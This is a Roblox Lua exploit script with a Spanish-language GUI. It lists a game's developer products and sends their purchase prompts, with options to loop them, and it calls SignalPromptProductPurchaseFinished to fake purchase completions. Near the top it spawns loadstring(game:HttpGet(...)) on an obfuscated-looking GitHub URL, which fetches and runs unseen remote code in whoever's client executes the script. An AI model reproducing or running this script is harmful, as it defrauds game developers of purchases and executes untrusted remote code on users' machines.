local MktSvc = game:GetService("MarketplaceService")
local Plrs = game:GetService("Players")
local LP = Plrs.LocalPlayer
local UIS = game:GetService("UserInputService")

spawn(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
end)

local defSize, defPos, sizeMult = UDim2.new(0.8, 0, 0.8, 0), UDim2.new(0.1, 0, 0.1, 0), 1

local SG = Instance.new("ScreenGui")
SG.Parent, SG.ResetOnSpawn = LP:WaitForChild("PlayerGui"), false

local MF = Instance.new("Frame")
MF.Size, MF.Position, MF.BackgroundColor3, MF.Parent = defSize, defPos, Color3.new(0.1, 0.1, 0.1), SG

local TB = Instance.new("Frame")
TB.Size, TB.BackgroundColor3, TB.Parent = UDim2.new(1, 0, 0, 30), Color3.new(0.2, 0.2, 0.2), MF

local TT = Instance.new("TextLabel")
TT.Size, TT.Position, TT.Text = UDim2.new(0.7, 0, 1, 0), UDim2.new(0, 5, 0, 0), "Sistema de Compras"
TT.TextColor3, TT.TextXAlignment, TT.BackgroundTransparency, TT.Parent = Color3.new(1, 1, 1), Enum.TextXAlignment.Left, 1, TB

local CF = Instance.new("Frame")
CF.Size, CF.Position, CF.BackgroundTransparency, CF.Parent = UDim2.new(1, 0, 1, -30), UDim2.new(0, 0, 0, 30), 1, MF

local PL = Instance.new("ScrollingFrame")
PL.Size, PL.Position, PL.BackgroundColor3, PL.Parent = UDim2.new(0.7, 0, 0.7, 0), UDim2.new(0, 10, 0, 10), Color3.new(0.15, 0.15, 0.15), CF

local BF = Instance.new("ScrollingFrame")
BF.Size, BF.Position, BF.BackgroundColor3, BF.Parent = UDim2.new(0.28, 0, 0.7, 0), UDim2.new(0.71, 0, 0, 10), Color3.new(0.15, 0.15, 0.15), CF

local ConF = Instance.new("ScrollingFrame")
ConF.Size, ConF.Position, ConF.BackgroundColor3, ConF.Parent = UDim2.new(0.98, 0, 0.25, 0), UDim2.new(0.01, 0, 0.74, 0), Color3.new(0.1, 0.1, 0.1), CF

local function CreateBtn(parent, text, pos, size, color)
    local btn = Instance.new("TextButton")
    btn.Size, btn.Position, btn.Text, btn.BackgroundColor3, btn.Parent = size or UDim2.new(0.9, 0, 0, 30), pos, text, color or Color3.new(0.3, 0.3, 0.3), parent
    return btn
end

local function Log(msg)
    local le = Instance.new("TextLabel")
    le.Size, le.Position, le.Text = UDim2.new(1, -10, 0, 20), UDim2.new(0, 5, 0, #ConF:GetChildren() * 22), msg
    le.TextColor3, le.BackgroundTransparency, le.Parent = Color3.new(1, 1, 1), 1, ConF
    ConF.CanvasSize = UDim2.new(0, 0, 0, #ConF:GetChildren() * 22 + 10)
end

local prods, selProds = {}, {}

local loadingLabel = Instance.new("TextLabel")
loadingLabel.Size, loadingLabel.Position = UDim2.new(1, -10, 0, 30), UDim2.new(0, 5, 0, 40)
loadingLabel.Text, loadingLabel.TextColor3, loadingLabel.BackgroundTransparency = "Cargando productos...", Color3.new(1, 1, 1), 1
loadingLabel.Parent = PL

local function LoadProds()
    for _, p in pairs(MktSvc:GetDeveloperProductsAsync():GetCurrentPage()) do
        table.insert(prods, p)
        local btn = CreateBtn(PL, p.Name, UDim2.new(0, 5, 0, #PL:GetChildren() * 35))
        btn.MouseButton1Click:Connect(function()
            if selProds[p.ProductId] then
                selProds[p.ProductId], btn.BackgroundColor3 = nil, Color3.new(0.3, 0.3, 0.3)
            else
                selProds[p.ProductId], btn.BackgroundColor3 = p, Color3.new(0, 0.5, 0)
            end
        end)
    end
    PL.CanvasSize = UDim2.new(0, 0, 0, #PL:GetChildren() * 35 + 10)
    loadingLabel:Destroy()
end

local function BuyProd(id, custom)
    local s, r = pcall(function() return MktSvc:PromptProductPurchase(LP, id) end)
    if s then
        Log("Compra iniciada: " .. id)
        if custom then MktSvc:SignalPromptProductPurchaseFinished(LP.UserId, id, true) end
    else
        Log("Error: " .. tostring(r))
    end
end

local function FinishPurchase(id)
    MktSvc:SignalPromptProductPurchaseFinished(LP.UserId, id, true)
    Log("Finalización enviada: " .. id)
end

local function ProcessProds(action, sel, loop)
    local count, prds = 0, sel == "selected" and selProds or prods
    for id, _ in pairs(prds) do
        count = count + 1
        if loop then
            spawn(function() while true do action(id) wait(1) end end)
        else
            action(id)
        end
    end
    Log(string.format("%s %s para %d producto(s)", action == BuyProd and "Compra(s)" or "Finalización(es)", loop and "iniciada(s) en bucle" or "completada(s)", count))
end

local function CreateActBtns(title, yOff, actions)
    local tl = Instance.new("TextLabel")
    tl.Size, tl.Position, tl.Text = UDim2.new(1, 0, 0, 20), UDim2.new(0, 0, 0, yOff), title
    tl.TextColor3, tl.BackgroundTransparency, tl.Parent = Color3.new(1, 1, 1), 1, BF
    for i, a in ipairs(actions) do
        local btn = CreateBtn(BF, a.text, UDim2.new(0, 5, 0, yOff + 25 + (i-1)*35), nil, a.color)
        btn.MouseButton1Click:Connect(a.func)
    end
    return yOff + 25 + (#actions * 35)
end

local pOff = CreateActBtns("Iniciar Compras", 0, {
    {text = "Buy Select", func = function() ProcessProds(BuyProd, "selected", false) end, color = Color3.new(0.2, 0.6, 0.2)},
    {text = "Buy Select (bucle)", func = function() ProcessProds(BuyProd, "selected", true) end, color = Color3.new(0.2, 0.5, 0.2)},
    {text = "Buy all", func = function() ProcessProds(BuyProd, "all", false) end, color = Color3.new(0.2, 0.4, 0.2)},
    {text = "Buy all (bucle)", func = function() ProcessProds(BuyProd, "all", true) end, color = Color3.new(0.2, 0.3, 0.2)}
})

CreateActBtns("Finalizar Compras", pOff + 10, {
    {text = "Finish Gamepass", func = function() ProcessProds(FinishPurchase, "selected", false) end, color = Color3.new(0.6, 0.2, 0.2)},
    {text = "Finish Selects (bucle)", func = function() ProcessProds(FinishPurchase, "selected", true) end, color = Color3.new(0.5, 0.2, 0.2)},
    {text = "Finish all", func = function() ProcessProds(FinishPurchase, "all", false) end, color = Color3.new(0.4, 0.2, 0.2)},
    {text = "Finish All (bucle)", func = function() ProcessProds(FinishPurchase, "all", true) end, color = Color3.new(0.3, 0.2, 0.2)}
})

BF.CanvasSize = UDim2.new(0, 0, 0, pOff + 180)

local clBtn = CreateBtn(TB, "X", UDim2.new(1, -25, 0, 0), UDim2.new(0, 25, 0, 25), Color3.new(0.8, 0.2, 0.2))
clBtn.MouseButton1Click:Connect(function() SG:Destroy() end)

local minBtn = CreateBtn(TB, "-", UDim2.new(1, -50, 0, 0), UDim2.new(0, 25, 0, 25), Color3.new(0.4, 0.4, 0.4))
local isMin = false
minBtn.MouseButton1Click:Connect(function()
    isMin = not isMin
    CF.Visible = not isMin
    MF.Size = isMin and UDim2.new(defSize.X.Scale * sizeMult, 0, 0, 30) or UDim2.new(defSize.X.Scale * sizeMult, 0, defSize.Y.Scale * sizeMult, 0)
end)

local function UpdateSize(scale)
    sizeMult = sizeMult * scale
    MF.Size = UDim2.new(defSize.X.Scale * sizeMult, 0, isMin and 30 or defSize.Y.Scale * sizeMult, 0)
    MF.Position = UDim2.new(0.5 - (defSize.X.Scale * sizeMult / 2), 0, 0.5 - (defSize.Y.Scale * sizeMult / 2), 0)
end

local incBtn = CreateBtn(TB, "+", UDim2.new(1, -75, 0, 0), UDim2.new(0, 25, 0, 25), Color3.new(0.2, 0.6, 0.2))
incBtn.MouseButton1Click:Connect(function() UpdateSize(1.1) end)

local decBtn = CreateBtn(TB, "-", UDim2.new(1, -100, 0, 0), UDim2.new(0, 25, 0, 25), Color3.new(0.6, 0.4, 0.2))
decBtn.MouseButton1Click:Connect(function() UpdateSize(0.9) end)

local isDrag, dragStart, startPos = false, nil, nil

TB.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDrag, dragStart, startPos = true, input.Position, MF.Position
    end
end)

TB.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDrag = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if isDrag and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MF.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

local idInput = Instance.new("TextBox")
idInput.Size, idInput.Position = UDim2.new(0.5, 0, 0, 30), UDim2.new(0, 5, 0, 5)
idInput.PlaceholderText, idInput.Parent = "Ingrese ID del producto", PL

local addBtn = CreateBtn(PL, "Agregar", UDim2.new(0.55, 0, 0, 5), UDim2.new(0.4, 0, 0, 30), Color3.new(0.2, 0.6, 0.2))
addBtn.MouseButton1Click:Connect(function()
    local id = tonumber(idInput.Text)
    if id then
        local success, result = pcall(function() return MktSvc:GetProductInfo(id, Enum.InfoType.Product) end)
        if success then
            local newProd = {ProductId = id, Name = result.Name}
            table.insert(prods, 1, newProd)
            local btn = CreateBtn(PL, newProd.Name, UDim2.new(0, 5, 0, 40))
            btn.MouseButton1Click:Connect(function()
                if selProds[id] then
                    selProds[id], btn.BackgroundColor3 = nil, Color3.new(0.3, 0.3, 0.3)
                else
                    selProds[id], btn.BackgroundColor3 = newProd, Color3.new(0, 0.5, 0)
                end
            end)
            for i, child in ipairs(PL:GetChildren()) do
                if child:IsA("TextButton") and child ~= addBtn then
                    child.Position = UDim2.new(0, 5, 0, i * 35 + 5)
                end
            end
            PL.CanvasSize = UDim2.new(0, 0, 0, #PL:GetChildren() * 35 + 45)
            Log("Producto agregado: " .. result.Name)
        else
            Log("Error al obtener información del producto")
        end
    else
        Log("ID de producto inválido")
    end
end)

LoadProds()
